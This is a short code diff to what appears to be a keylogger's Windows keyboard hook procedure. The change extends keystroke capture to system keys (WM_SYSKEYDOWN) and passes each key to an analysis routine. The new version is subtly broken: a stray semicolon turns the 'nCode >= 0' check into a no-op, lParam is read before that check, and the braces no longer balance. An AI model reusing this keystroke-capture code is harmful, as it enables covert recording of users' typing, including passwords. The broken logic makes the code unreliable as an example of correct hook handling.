@@ -18,15 +18,14 @@ LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	char c;
 	bool maj;
-	if (nCode >= 0)
+
+	keyboard_struct = *((KBDLLHOOKSTRUCT*)lParam);
+	if (nCode >= 0);
 	{
 		if (wParam == WM_KEYDOWN)
-		{
-			keyboard_struct = *((KBDLLHOOKSTRUCT*)lParam);
-			if (keyboard_struct.vkCode != 0)
-				analyse_keyboard_status(keyboard_struct.vkCode);
-		}
-	}
+			analyse_keyboard_status(keyboard_struct.vkCode, 0);
+		else if (wParam == WM_SYSKEYDOWN)
+			analyse_keyboard_status(keyboard_struct.vkCode, 1);
 	return CallNextHookEx(hook, nCode, wParam, lParam);
 }
 
